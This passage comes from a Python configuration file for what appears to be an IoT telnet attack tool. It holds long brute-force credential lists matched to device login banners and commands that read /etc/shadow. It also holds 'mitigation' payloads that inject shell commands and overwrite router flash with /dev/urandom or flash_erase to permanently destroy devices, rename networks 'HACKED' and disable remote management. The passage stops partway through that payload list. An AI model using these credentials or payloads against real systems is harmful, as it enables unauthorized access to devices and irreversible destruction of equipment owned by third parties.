  [ 'Algar login',
    'super/super',
  ],
	# hktos something
	[ 'hktos login',
		'root/public',
	],
	# H640DW/GW thingy
	[ 'H6\d\S+ login',
		'root/vertex25ektks123',
	],
	# VMG1312, prefer root account over the common but low-priv user/user
	[ 'VMG\d+\-B10',
		'root/zyad1234',
		'supervisor/zyad1234',
		'admin/admin1234',
		'admin/admin',
		'admin/1234',
		'admin/password',
		'zyuser/1234',
		'support/support',
		'user/user',
		'admin/ttnet',
  ],
  # misc
  [ 'tc login',
    'dnsekakf2$$/dnsekakf2$$',
  ],
  [ '(tc|DSL50\S+EN.*) login',
		'admin/1234', 
		'root/vertex25ektks123', 
		'admin/admin', 
		'support/support', 
		'admin/12345', 
		'admin/admin1', 
		'admin/123456', 
		'admin/password', 
		'admin/0000', 
		'admin/ttnet',
		'admin/4321', 
		'admin/1234567890', 
		'admin/admin123', 
		'admin/1111', 
		'admin/54321', 
		'admin/admin1234', 
		'admin/654321', 
		'admin/administrator', 
		'engineer/amplifier',
		'admin/service',
		'admin/adsl',
		'admin/superman',
		'admin/vertex25ektks123', 
		"user3/12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678",
	],
    # Linux 2.6.22 (fw.ccee) (ttyp ....
    [ 'Linux.*ttyp.*login',
	  'root/tslinux',
    ],
	# ralink busybox aquario
	[ '(ralink|aquario) login',
	  'Admin/',
		'admin/aquario',
	  'admin/admin',
	  'Admin/123456',
	  'admin/h@32LuyD',
	  'Admin/admin',
	  'admin/1234',
	  'admin/666',
	],
  # bintec stuff
  [ 'Welcome to RS',
  	'admin/admin',
  	'write/private',
  ],
  # ZyXEL P-870HNU
  [ '870HNU',
  	'1234/1234',
  ],
  # Probably just a single subnet but adding here just in case
  [ 'AMI[0-9A-F]+ login',
	'sysadmin/superuser',
  ],
  # Some silly school thing
  [ 'Techno India College',
    'student/student',
  ],
	# Ubee thingy default pw
	[ 'Ubee Interactive Corporation Telnet Server',
	  'root/root',
	],
	# Davolink switches
	[ 'davolink login',
		'root/admin',
		'admin/admin',
		'davo/drc',
	],
	# Alcatel-Lucent Omniswitch default pw
	[ 'login :',
		'admin/switch',
	],
	# Comtrend
	[ 'Comtrend Gigabit',
		'1234/1234',
	],
  # some botnet kid who likes to change the device hostname
	['Lurkin\d+ login',
	  'dnsekakf2$$/dnsekakf2$$',
	  'teladmin/hacktheworld1337',
    'root/icatch99', 
    'root/',
    'root/password',
    'Admin/',
	],
  # GPON routers, port 26 backdoor shell needs to be enabled via port 23
  # which in turn typically needs enabling via a superuser web interface login
  [ 'PORT:26:' ,
    'root/GEPON',
		'root/root',
  ],
  # GPON routers port 23, interface typically needs enabling via web UI first
	['acl IP:',
	 'rdsadmin/adu#',		# here username actually does not matter usually, only pw needs to be right
	 'gepon/gepon',
	 'gpon/gpon',
	],
  # samsung login
  [ 'samsung login',
    'admin/samsung',
  ],
	# Covad Ubigate 
	[ 'SAMSUNG ELECTRONICS .*Login',
		'root/',
		'admin/password',
	],
	# iGate thing
	[ 'iGate .*ADSL',
		'admin/vnpt',
		'operator/operator',
	],
	# Some oddball DD-WRTs
	[ 'DD-WRT v',
		'root/samsung',
		'root/alpine',
		'root/admin',
		'root/1',
		'root/root',
		'root/password',
		'root/Admin',
		'root/1234',
	],
	# ZEM500
	[ '(Z[A-Z]M\d\d\d|Welcome to Linux)',
		'root/founder88',
		'root/solokey',
	],
	# MontaVista
	[ 'MontaVista.*Linux',
		'ftp/ftp',
		'admin/admin',
		'service/service',
		'admin/123456',
		'admin/manager',
	],
	# Aamra Networks
	[ 'Aamra Networks LIMITED',
		'support/support123',
	],
	# domain.name
	[ 'domain\.name login',
		'Admin/',
	],
	# EDR thing
	[ 'EDR\-\S+ login',
		'user/',
	],
	# Hikvision logins, some defaults, some common ones.
	[ '(192.0.0.64|dvrdvs|Hikvision) login', 
		'root/12345',
		'root/888888',
		'root/54321',
		'root/123456',
		'root/000000',
		'root/00000',
		'root/1234',
		'root/1',
		'root/123',
		'root/1234567890',
		'root/hiklinux',
		'root/321',
		'root/1234567',
		'root/123123',
		'root/696969',
		'root/4321',
		'root/1111',
		'root/1234qwer',
		'root/password',
		'root/pu',
		'root/0000',
		'root/admin',
		'root/5555',
		'root/7777',
		'root/11111',
		'root/654321',
		'root/hikvision',
		'root/123456789abc',
		'admin/12345',
		'admin/1234',
		'admin/1234567890',
		'admin/admin1234',
		'admin/123456',
		'admin/admin',
		'admin/666666',
		'admin/654321',
		'admin/1111',
		'admin/admin1',
		'admin/22222',
		'admin/power',
		'admin/abc123',
		'admin/11111111',
		'admin/2222',
		'admin/0000',
		'admin/4321',
		'admin/123456789abc',
		'guest/12345',
		'hikvision/hikvision',
    'teladmin/hacktheworld1337',
	],
	# Turk Telekom default
	[ '[rR][tT]-2\d+ login',
		'root/ttnet',
	],
  # IPTV500\S+ thing
  [ 'IPTV\S+ login',
    'admin/power',
  ],
	# mg3500 thingies
	[ '(t4-main|sanyo-board|smarteyes) login',
		'root/m',
		'root/mobiroot',
		'mg3500/merlin',
	],
	# meritlilin
	[ 'meritlilin',
		'root/pass',
	],
	# multiqb default
	[ 'MultiQb login',
		'root/admin',
	],
	# Avaya
	[ 'Avaya Cajun',
		'diag/danger',
	],
	# AVer
	[ 'DB88FXX81 login',
		'root/svgodie',
	],
	# Draytek
	[ 'Draytek login',
		'draytek/1234',
	],
	# Tera EP
	[ 'Tera-EP login',
		'admin/admin',
		'admin/1q2w3e',
	],
  # Axis Developer Board LX
  [ 'Axis Developer Board',
    'root/pass',
    'admin/',
  ],
  # internet login
  [ 'internet login',
    'root/vertex25ektks123',
  ],
	# HDFW System
	[ 'HDFW System',
		'hscroot/abc123',
	],
	# Hangzhou thing
	[ 'Copyright \(c\) 2004-20\d\d Hangz',
		'admin/admin',
		'telecomadmin/nE7jA%5m',
		'admin/admin123',
		'admin/123456',
		'admin/',
		'root/admin',
		'admin/Admin',
		'admin/admin1',
    'admin1/admin1',
    'admin/admin@123',
		'admin/admin1234',
		'telecom/telecom',
		'webadmin/webadmin',
		'guest/guest',
		'123/123',
		'root/123',
		'user/user',
		'root/root',
		'admin/system',
		'admin/adminadmin',
		'root/',
		'root/123456',
		'admin/0000',
		'admin/654321',
		'simple/h3c',
    'test/test',
	],
	# telnet session telnetX on /dev/ things
	[ 'telnet session telnet',
	  'user/',
	  'test1/test1',
	],
	# Nortel thing
	[ 'Nortel Telnet Login',
	  'admin/setup',
	],
	# HP thing
	[ 'Copyright \(c\) 2010-201\d Hewle',
		'admin/admin',
		'admin/admin123',
		'admin/password',
		'admin/ADMIN',
		'admin/',
		'administrator/123',
	],
	# Some D-link thing
	[ 'Dlink-Router login',
		'admin/qwerty',
		'admin/admin',
		'admin/12345',
		'admin/123456',
		'admin/Admin',
		'admin/internet',
	],
	# Some ROS thing
	[ 'this is ROS',
		'administrator/administrator',
	],
	# AG 5900 thing
	[ 'AG 5\d+',
		'operator/operator',
	],
  # PNLB login
	[ 'PNLB login',
	  'root/root123456',
	],
  # hslwificam things
  [ '(apk-link|Ex\d\d\d)',
    'root/hslwificam',
    'root/icatch99',
    'root/vertex25ektks123',
    'admin/vertex25ektks123',
  ],
  # SunLinUniv
	[ 'SunLinUnivV',
	  'test/guest',
	  'test/123123',
	  'test/1234',
	],
	# cxlinux stuff
  [ 'localhost login',
    'root/cxlinux',
  ],
  # Corona something
  [ '(Corona\S+|lockdownbot\S+|z3hir\S+|[a-zA-Z]+:\d\d+) login',
    'root/icatch99',
  ],
  # goke 
  [ 'goke login',
    'root/cxlinux',
    'root/jvbzd',
  ],  
	# BCM99999 sixpon thing
	[ 'BCM99999.*VosLogin',
	  'telnetadmin/telnetadmin',
		'admin/zhone',
		'root/1234567890',
		'root/54321',
		'admin/Admin',
		'IntraStack/Asante',
		'root/cat1029',
		'admin/smcadmin',
		'admin/admin',
		'admin/4321',
		'admin/1234',
		'admin/1234567890',
	  'ubnt/ubnt',
	  'guest/guest123',
	  'root/',
	  'quser/quser',
	  'user/user',
	  'Alphanetworks/wrgn23_dlwbr_dir600b',
    'admin/atlantis',
	  'admin/mts',
	  'admin/wbox',
	  'vt100/public',
	  'admin/AitbISP4eCiG',
	  'uucp/uucp',
	  'root/0P3N',
	  'admin/switch',
	  'login/1111',
	  'ktuser/homehub',
	  'root/camera',
	  'cisco/default',
	  'telecomadmin/******',
	  'none/ascend',
	  'root/tiger',
	  '666666/666666',
	  'admin/590152',
	  'admin/adslolitec',
	  'admin/ttnet',
	  'guest/1234',
    'root/ikwb',
	  'cablemodem/robotics',
    'default/nmgx_wapia',
	],
  # DSL-N12U login
  [ 'DSL-\S+ login',
	  'admin/555555555',
	],
	# OpenWrt and OpenWRT
	[ 'OpenW[rR][tT] login',
	  'root/admin',
	],
  # Qualcomm MDM9615-cdp
  [ 'OpenEmbedded Linux',
    'root/oelinux123',
  ],
  # msopassword thing
  [ 'CGN\S+ login',
    'mso/msopassword',
  ],
  # longse login thing
  [ 'longse login',
    'adminlvjh/adminlvjh123',
  ],
	# XG6846 and BCM96338 XG6749
	[ 'XG6\d+',
	  'admin/admin',
	  'support/support',
	  'admin/operator',
	],
	# BCM96848
	[ 'BCM96848',
	  'CUAdmin/CUAdmin',
    'telnetadmin/telnetadmin',
    'admin/admin',
	],
	# BCM968500
	[ 'BCM968500',
	  'e8telnet/e8telnet',
	],
	# BCM95354
	[ 'BCM95354',
	  'telecomadmin/nE7jA%5m',
	],
	# BCM95357
	[ 'BCM95357',
	  'telnetadmin/telnetadmin',
	],
	# BCM96821
	[ 'BCM96821',
	  'e8ehome/e8ehome',
	  'e8ehomeasb/e8ehomeasb',
	  'e8telnet/e8telnet',
	],
	# BCM96828
	[ 'BCM96828',
	  'admin/admin',
	  'user/user',
	  'e8telnet/e8telnet',
		'e8ehomeasb/e8ehomeasb',
	  'e8ehome/e8ehome',
	  'admin/password',
    'telnetadmin/telnetadmin',
    'admin/vsONU101',
    'supportadmin/supportadmin',
		'/',
	],
  [ 'BCM963167',
    'support/support',
    'admin/motorola',
  ],
  # BCM96358
  [ 'BCM96358',
	  'support/support',
	  'telecomadmin/nE7jA%5m',
	  'root/12345',
	],
	# BCM963268
	[ 'BCM963268',
		'support/support',
		'support/1234',
		'admin/admin',
		'1234/1234',
		'admin/adslroot',
		'admin/CenturyL1nk',
		'root/12345',
	],
	# BCM96338
	[ 'BCM96338',
		'admin/password',
		'support/support',
		'admin/362729',
		'admin/263297',
		'admin/admin',
		'admin/123456',
		'support/admin',
	],
	# BCM96328 thing
	[ 'BCM96328',
	  'admin/password',
	  'admin/admin',
	  'support/support',
	  'user/user',
	  '1234/1234',
	  'user/user',
	  'admin/administrator',
	  'support/1234',
	  'root/12345',
	  'admin/gvt12345',
	  'admin/362729',
	  'admin/',
	  'support/changeme',
	  'e8ehome/e8ehome',
	],
	# BCM96818 
	[ 'BCM96818 Broadband',
		'user/user',
		'admin/password',
		'user/password',
	],
	# BCM96318 thing
	[ 'BCM96318 Broadband',
	  'support/support',
	  'admin/admin',
	  'superadmin/Is$uper@dmin',
	  'user/user',
	  'admin/ho4uku6at',
	  'support/1234',
	  'admin/admin1234',
	  'admin/admin01',
	  'admin/rombik1',
	  'admin/admin123',
	  'root/12345',
	],
	# BCM96362
	[ 'BCM96362 Broadband',
	  'support/support',
	  'user/',
	],
	# BCM96368
	[ 'BCM96368 xDSL',
		'support/support',
		'telecomadmin/nE7jA%5m',
	],
	# Hello, this is epon olt
	[ 'this is epon olt',
	  'admin/admin',	
		'ajay/ajay',
	  'test/test',
	],
	# netis
	[ 'netis login',
		'root/realtek',
	],
	# MGI Login
	[ 'MGI Login',
	  'target/password',
	],
	# Modem Digital xDSL DSLink 485
	[ 'xDSL DSLink',
	  'admin/gvt12345',
	],
  # C-Data
  [ 'rface for EPON System',
    'root/root126',
    'suma123/panger123',
    'debug/debug124',
    'guest/',
  ],
	# Residential gateway
	[ 'Residential Gateway',
		'support/support',
		'user/password',
	],
	# router login
	[ 'router login:',
		'admin/1234',
		'user/1234',
    'admin/admin@123',
	],
	# Router login
	[ 'Router login:',
	  'root/123456',
	  'adm/123456',
	  'root/admin',
	],
	# NetComm
	[ 'NetComm ADSL2\S Wireless Router',
		'admin/admin',
		'support/support',
		'admin/362729',
	],
  # RICOH Maintenance Shell, some printer thing
  [ 'RICOH Maintenance Shell',
    'admin/',
    'supervisor/',
  ],
  # GOCLOUD, some Chinese IoT router with a copycat 'User Access Verification' banner
  # basically only asks for password so username is irrelevant.. default is 'admin'
  # and 'abc123' is pretty common, the rest are rare. CLI is on port 2601
  [ '(Welcome to visit .* series router|GOCLOUD)',
    'admin/admin',
    'admin/888888',
    'admin/abc123',
    'admin/',
    'admin/Admin',
    'admin/gocloud',
    'admin/123456',
    'admin/admin',
    'admin/123',
    'admin/password',
    'admin/1qaz2wsx',
    'admin/adminadmin',
    'admin/nimda',
    'admin/12345',
    'admin/1234',
    'admin/12345678',
    'admin/admin1',
    'admin/admin2',
  ],
	# Cisco Ubee-like thingy
	[ 'Embedded Telnet Server.*WARNING:.*authorized users only',
	  'cisco/cisco',
	],
	# Cisco regular
	[ 'User Access Verification', 
	  "admin/admin",
	  "cisco/cisco",
	  "root/root",
	  "admin/",
	  "cisco/",
  	"Cisco/Cisco",
	  "admin/cisco",
	  "administrator/administrator",
	  "Advertisements/Advertisements",
	  "admin/123456",
	  "admin/password",
	  "admin/admin123",
	  "Administrator/password",
	  "Admin/123",
	  "router/router",
	  "test/test123",
	  "service/service",
	  'admin/admin12345',
	  'test/test',
	  'admin/test',
	  'root/1234',
	  'telecom/telecom',
	  'user/user',
	  'admin/admin1',
	  'Admin/123',
	  'nagios/nagios',
	  'mg3500/merlin',
	  'Admin/1234',
	  'piranha/piranha',
	  'admin/root',
	  'admin/ADMIN',
	  'guest/guest',
	  'admin/1234567890',
	  'root/root1234',
	  'support/123456',
	  'test1/test1',
    'cellit/cellit',
	  'homeultera/homeultera',
	  'super.super/master',
	  'root/asmcadmin',
	  'monitor/monitor',
    '1/1',
	  '123/123',
	  'Conf/admin',
    'pu\x7cx\x7f/rQ\x7feg#!!!',
		'admin/enable36291',
    'maintainer/bcpb+serial#',
	],
	# Zyxel login
	[ 'ZyXEL login',
	  'admin/admin',
	  'admin/1234',
	  'admin/123456',
	  'admin/admin1',
	  'admin/password',
	  'admin/adminadmin',
	  'admin/12345',
	  'admin/admin1234',
	  'admin/adminadmin',
  ],
	# Ruckus Wireless
	[ 'Please login',
	  'super/sp-admin',
	  'admin/password',
	  'admin/sp-admin',
	],
	# HP thingy, lists available logins when defaults set
	[ 'Admin/Admin',
		'Admin/Admin',
	],
	# Elsist devices
	[ 'Elsist.*maintenance shell',
		'Admin/Admin',
	],
	# Huawei HG532 etc
	[ '(Welcome Visiting Huawei Home|ATP Cli)',
		'admin/admin',
		'user/user',
		'root/admin',
		'admin/1234',
		'support/support',
		'!!Huawei/@HuaweiHgw',
		'superadmin/!@HuaweiHgw',
		'admin/ztonpk',
		'admin/c@ntv2000',
	],
	# Alcatel thingies
	[ '(AONT login|## login ##|192\.168\.0\.0 login)', 
		'ONTUSER/SUGAR2A041',
		'root/root',
		'root/huigu309',
		'admin/admin',
		'IUSACELL/admin',
		'usradmin/usradmin',
		'CRAFTSPERSON/ALC#FGU',
	],
  # IPNC login things
  [ 'IPNC login',
	  'root/hdipc%No',
	],
  # iGate AW300N Wifi ADSL2+ Modem thing
	[ 'iGate \S+ Wifi',
	  'admin/vnpt',
	],
  # Some tango3 things
  [ 'tango3 login',
    'root/e2008jl',
  ],
	# Air5-etc thingies
	[ 'Air\S+ login',
	  'root/12341234',
	  'root/admin',
	  'root/',
	  'admin/airlive',
	  'root/1234567',
	  'root/ttnet',
	  'root/1111',
	  'root/1020304',
	  'root/121212',
	  'root/654321',
	  'root/rootme',
	  'root/1q2w3e4r',
	],
	# Maybe nothing?
	[ 'UCS Technology Services',
	  'nagios/nagios',
	],
  # Welcome on your dreambox
  [ '(Gemini Project|reambox|openpli)',
    'root/dreambox',
  ],
	# RT whatever what is
	[ 'RT\-\d+\S+ login',
		'root/12341234',
		'root/Admin',
		'root/ttnet',
		'root/00000',
		'admin/qwerty',
	],
  # more RT
  [ 'RT-G\S+ login',
	  'admin/admin',
	  'admin/support',
	],
  # IPCAM login
  [ 'IPCAM login',
    'root/059AnkJ',
  ],
  # LS-O9710n login, RL804W, WR3010N
	[ '(LS|RL|ANS|WR|BES|GL|S\d\d\d)\S+ login',
	  'telnet/telnet',
  ],
	# LS-O9710n iss3 login
	[ '(LS|RL|ANS|WR|BES|GL)\S+\s\S+\slogin',
	  'telnet/telnet',
	],
	# Huawei Home Gateway
	[ 'Huawei Home Gateway',
	  'support/support',
	],
  # following are the HT-TM specific banners seen so far (not very common anyway)
  [ 'FG1060N login',
  	"root/20080826"
  ],
  [ 'HT-TM05 login',
  	"root/20080826"
  ],
  [ 'M2M login',
  	"root/20080826"
  ],
  [ 'NEXTAV login',
  	"root/20080826"
  ],
  [ 'SVWIFI login',
  	"root/20080826"
  ],
  [ 'TM01 login',
  	"root/20080826"
  ],
  [ 'TM02 login',
  	"root/20080826"
  ],
  [ 'WD02 login',
  	"root/20080826"
  ],
  [ 'WD-N2 login',
  	"root/20080826"
  ],
  [ 'WeZeeCard login',
  	"root/20080826"
  ],
  [ 'WiDisk login',
  	"root/20080826"
  ],
  [ 'WIFIUSB2 login',
  	"root/20080826"
  ],
  [ 'ShAirDisk login',
  	"root/20080826"
  ],
  [ 'aigoWiFi login',
  	"root/20080826"
  ],
]
# then try the generic alternatives
bruteforce_dictionary_generic = [
	"root/root",
	"admin/admin",
	"root/vizxv",
	"root/GM8182",
	"root/xc3511",
	"root/xmhdipc",
	"admin/1234",
	"support/support",
	"root/123456",
	"root/1234",
	"root/12345",
	"root/1001chin",  
	"root/password",
	"admin/password",
	"root/54321",
	"root/juantech",
	"root/tsgoingon",
	"root/admin",
	"admin/7ujMko0admin",
	"admin/smcadmin",
	"admin/admin1234", 
	"admin/12345",
	"admin/123456",
	"admin/1111",
	"root/Zte521",  
	"root/jvbzd",
	"user/user",
	"admin/smcadmin",
	"guest/guest",
	"root/dreambox",    
	"root/zlxx.",
	"ubnt/ubnt",
	"root/cat1029",
	"root/hunt5759",    
	"root/adminpassword",
	"root/5up",      
	"admin/zhone",
	"admin/admin1",
	"root/",
	"admin/epicrouter",
	"root/123456",
	"root/antslq",
	"admin/admin123",
	"supervisor/zyad1234",
	"admin/1234567890",
	"superadmin/Is$uper@dmin",
	"admin/ho4uku6at",
	"support/admin",
	"root/123",
	"root/1234567890",
  "1234/1234",
	"admin/54321",
	"root/win1dows",
	"admin/",
	"root/888888",
	"admin/888888",
	"root/Win1doW$",
	"mg3500/merlin",
	"root/oelinux123",
	"ubnt/ubnt",
	"admin/0000",
	"admin/11111111",
	"admin/4321",
	"admin/654321",
	"admin/666666",
	"root/000000",
	"root/founder88",
	"root/1111",
	"admin/system",
	"guest/123456",
	"root/666666",
	"root/0000",
	"root/Admin",
	"root/00000",
	"root/root123",
	"root/ipcam_rt5350",
	"guest/guest123",
	"root/1",
  "root/win1dows",
  "Admin/Admin",
	"ONTUSER/SUGAR2A041",
  'admin/P@55w0rd!',
  '123/123',
  'root/ttnet',
  'adm/123456',
]

# random pool for opportunistic brute forcing
bruteforce_dictionary_extra = [
'/',
'1/1',
'1111/1111',
'123/123',
'1234/1234',
'12345678/ADMIN',
'a/a',
'adm/123456',
'admin/',
'Admin/',
'admin/0000',
'admin/00000000',
'admin/000000000',
'admin/1111',
'admin/11111111',
'admin/123',
'Admin/123',
'admin/1234',
'Admin/1234',
'admin/12341234',
'admin/12345',
'admin/123456',
'admin/1234567890',
'admin/1234qwer',
'admin1/admin1',
'admin/2222',
'admin/22222222',
'admin/362729',
'admin/4321',
'admin/54321',
'admin/654321',
'admin/666',
'admin/666666',
'admin/77777',
'admin/77777777',
'admin/7ujMko0admin',
'admin/888888',
'admin/888888888',
'admin/a1sev5y7c39k',
'admin/abc123',
'admin/admin',
'admin/Admin',
'admin/ADMIN',
'Admin/admin',
'Admin/Admin',
'admin/admin01',
'admin/admin1',
'admin/admin@123',
'admin/admin123',
'admin/Admin123',
'admin/admin1234',
'admin/admin99',
'admin/adminadmin',
'admin/administrator',
'admin/adslroot',
'admin/airlive',
'admin/aquario',
'admin/CenturyL1nk',
'admin/cisco',
'admin/default',
'admin/enable36291',
'admin/gfhjkm',
'admin/guest',
'admin/gvt12345',
'admin/h@32LuyD',
'admin/ho4uku6at',
'admin/ipcam_rt5350',
'administrator/administrator',
'Administrator/password',
'adminlvjh/adminlvjh123',
'admin/manager',
'admin/motorola',
'admin/netadmin',
'admin/nimda',
'admin/operator',
'admin/P@55w0rd!',
'admin/pass',
'admin/passw0rd',
'admin/password',
'admin/power',
'admin/P@ssw0rd',
'admin/qazxsw',
'admin/qwerty',
'admin/qwertyuiop',
'admin/QwestM0dem',
'admin/radmin',
'admin/rombik1',
'admin/root',
'admin/samsung',
'admin/service',
'admin/setup',
'admin/smcadmin',
'admin/support',
'admin/switch',
'admin/system',
'admin/test',
'admin/tsunami',
'admin/ubnt',
'admin/user',
'admin/vertex25ektks123',
'admin/vnpt',
'admin/vsONU101',
'admin/xad#12',
'admin/xad$l#12',
'admin/zhone',
'admin/ztonpk',
'ajay/ajay',
'Alphanetworks/wrgn23_dlwbr_dir300b',
'anonymous/anonymous',
'apache/apache',
'baby/baby',
'cisco/123456',
'cisco/cisco',
'Cisco/Cisco',
'CRAFTSPERSON/ALC#FGU',
'CUAdmin/CUAdmin',
'daniel/daniel',
'debug/debug124',
'default/123456',
'default/admin',
'draytek/1234',
'e8ehomeasb/e8ehomeasb',
'e8ehome/e8ehome',
'e8telnet/e8telnet',
'enable/cisco',
'FIELD/HPP187 SYS',
'FIELD/HPWORD PUB',
'ftp/ftp',
'ftpuser/ftpuser',
'GDEv/GDEv',
'gepon/gepon',
'guest/',
'guest/123',
'guest/12345',
'guest/123456',
'guest/guest',
'guest/guest123',
'guest/password',
'home/12345678',
'hscroot/abc123',
'HUAWEI/admin@huawei.com',
'!!Huawei/@HuaweiHgw',
'informix/informix',
'maintainer/bcpb+serial#',
'manager/friend',
'Manager/friend',
'manager/manager',
'mg3500/merlin',
'monitor/monitor',
'mso/msopassword',
'mtcl/mtcl',
'nagios/nagios',
'netgear/1234',
'netscreen/netscreen',
'noc/noc',
'ONTUSER/SUGAR2A041',
'operator/operator',
'piranha/piranha',
'prueba/prueba',
'rdsadmin/adu#',
'root/',
'root/0000',
'root/00000',
'root/000000',
'root/1',
'root/1001chin',
'root/1111',
'root/111111',
'root/123',
'root/1234',
'root/12341234',
'root/12345',
'root/123456',
'root/1234567',
'root/12345678',
'root/1234567890',
'root/1234qwer',
'root/1q2w3e4r',
'root/1q2w3e4r5',
'root/20080826',
'root/2011vsta',
'root/222',
'root/4321',
'root/54321',
'root/55555',
'root/5up',
'root/654321',
'root/666666',
'root/77777',
'root/7ujMko0vizxv ',
'root/888888',
'root/admin',
'root/Admin',
'root/Admin123',
'root/adminpassword',
'root/antslq',
'root/cat1029',
'root/cisco',
'root/Ckdgus11',
'root/connect',
'root/dreambox',
'root/e2008jl',
'root/Focushns',
'root/founder88',
'root/GEPON',
'root/GM8182',
'root/gw1admin',
'root/h2014071',
'root/hdipc%No',
'root/hg2x0',
'root/hunt5759',
'root/icatch99',
'root/ipc71a',
'root/IPCam@sw',
'root/juantech',
'root/jvbzd',
'root/oelinux123',
'root/pass',
'root/password',
'root/qazxsw',
'root/qwe123',
'root/qwerty',
'root/root',
'root/root123',
'root/root126',
'root/rootpassword',
'root/solokey',
'root/swsbzkgn',
'root/team2',
'root/toor',
'root/tsgoingon',
'root/tslinux',
'root/ttnet',
'root/vertex25ektks123',
'root/vhd1206',
'root/vizxv',
'root/Win1doW$',
'root/win1dows',
'root/wuhanyatelan',
'root/xc3511',
'root/xmhdipc',
'root/zlxx.',
'root/Zte521',
'root/zxcvbnm',
'router/router',
'service/cat',
'service/service',
'simple/h3c',
'simple/huawei',
'suma123/panger123',
'superadmin/Is$uper@dmin',
'super.super/master',
'supervisor/',
'supervisor/zyad1234',
'support/',
'support/1234',
'support/123456',
'support/1qaz2wsx',
'support/admin',
'supportadmin/supportadmin',
'support/support',
'support/support123',
'sysadmin/superuser',
'system/123456',
'system/12345678',
'system/admin',
'system/system',
'target/password',
'tech/tech',
'teladmin/hacktheworld1337',
'telecomadmin/nE7jA%5m',
'telecomadmin/telecomadmin',
'telecom/telecom',
'tellabs/tellabs#1',
'telnetadmin/telnetadmin',
'telnet/telnet',
'test/1234',
'test/123456',
'test1/test1',
'teste/teste',
'test/guest',
'test/test',
'test/test123',
'toto/toto',
'ubnt/ubnt',
'user/',
'user/1234',
'user/12345',
'user/123456',
'user/123456789',
'user/1234567890',
'useradmin/useradmin',
'user/cisco',
'user/digi',
'user/password',
'user/public',
'user/user',
'user/user123',
'vpn/vpn',
'vstarcam2015/20150602',
'webadmin/webadmin',
'write/private',
'zyuser/1234',
]

# marker for splitting file into smaller parts for piecemeal parsing
splitvar = "SPLTX"

# stupid random password generator for using on honeypot-looking things
genboguspw1 = [ 'TELCO', 'inet', 'zyxel', 'ZYX', 'zyx', 'huawei', 'LZE', 'lze', 'qualcomm', 'dlink', 'broadcom', 'router', 'DLink', 'main', 'wan', 'global', 'cpa', 'customer', 'linux', 'default', 'cisco' ]
genboguspw2 = [ '%s' % ( random.randint( 100,999 ) ), '%s' % ( random.randint( 10,99 ) ), '%s' % ( random.choice( '%#!@_=;' ) ), '%s' % ( random.choice( 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' ) ) ]
genboguspw3 = [ 'admin', 'ADMIN', 'support', 'mgmt', 'manager', 'adm', 'ADM', 'root', 'account', 'cs', 'corporate', 'business', 'fiber', 'adsl', 'vdsl', 'wifi', 'administrator', 'Administrator', 'default', 'factory' ]
bogushoneypotlogin = 'root/'+ random.choice(genboguspw1) + random.choice(genboguspw2) + random.choice(genboguspw3)

bruteforce_fingerprinting_commands = "w\nuname -a\nls -alF /etc/\ncat /etc/passwd\ncat /etc/shadow\ncat /proc/version\n";

bruteforce_router_mitigations = [

	# Another Broadcom router but using custom payload for it due to telnet killers
	[ 'dsl500b', '.*', 'DSL-500B',
	  'ping ;sh', '',
	  'cat /dev/urandom >/dev/mtdblock0 &', '',
	  'cat /dev/urandom >/dev/mtdblock1 &', '',
	  'cat /dev/urandom >/dev/mtdblock2 &', '',
	  'cat /dev/urandom >/dev/mtdblock3 &', '',
	  'cat /dev/urandom >/dev/mtdblock4 &', '',
	  'cat /dev/urandom >/dev/mtdblock5 &', '',
	  'cat /dev/urandom >/dev/mtdblock6 &', '',
	  'cat /dev/urandom >/dev/mtdblock7 &', '',
	  'cat /dev/urandom >/dev/root &', '',
	  'iptables -A OUTPUT -j DROP', '%WAIT%',
	],
  
	# BCM Broadband Routers
  # One of the craziest payloads out there. A gazillion different stack configs, many of them
  # will just randomly disconnect you if you enter the wrong command at the wrong time. The
  # below sequence was a good starting point for the 2017 IoT wars, and I had a "double tap" 
  # system ready to whack any devices which failed to respond to this seq. Back in 2017 I had
  # ca a 10% failure rate, could be bigger now. Lots of root shell exploits which I still haven't
  # seen documented anywhere.
	[ "broadcom", ".*", "(telnetd.*error.*processInput.*unrec.*|BCM96|ls -alF /etc/: not found)", 
		'lan config --ipaddr primary 10.1.2.3 255.255.255.248', '',
		'wlan config --ssid "HACKED: DEFAULT PASSWORD"', '',
		'wlan config --enable 0', '',
		'wlan config --ssid primary "HACKED: DEFAULT PASSWORD"', '',
		'wlan config --status primary disable', '',
		'save', '',
		'tr69cfg --inform disable', '',
		'tr69cfg --connreq disable', '',
		'tr69cfg --password HACKED', '',
		'tr69cfg --intf HACKED', '',
		'tr69cfg --info', '',
		'tr69c ConnReqPort 31351', '',
		'save', '',
		'tftp -p -t f -f `cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/root;route del default` 127.0.0.1', '',
		'tftp -p -t c -f `cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/root;route del default` 127.0.0.1', '',
		'nslookup $(sh)', '',
		'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/root;route del default', '',
		'kill `sh`', '',
		'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/root;route del default', '',
		'tftp -p -f test ;flash_erase /dev/mtdblock0 0 999999 0;flash_erase /dev/mtdblock1 0 999999 0;flash_erase /dev/mtdblock2 0 999999 0;flash_erase /dev/mtdblock3 0 999999 0', '',
		'tftp -p -f test ;cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/root', '',
		'tftp -p -f test ;route del default', '',
    'ifconfig $(sh)', '',
		'cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3;cat /dev/urandom >/dev/root;route del default', '',
		'cat | sh', '',
		'sh', '[#>]',
		'flash_erase /dev/mtdblock0 0 999999 0', '[$>#]',
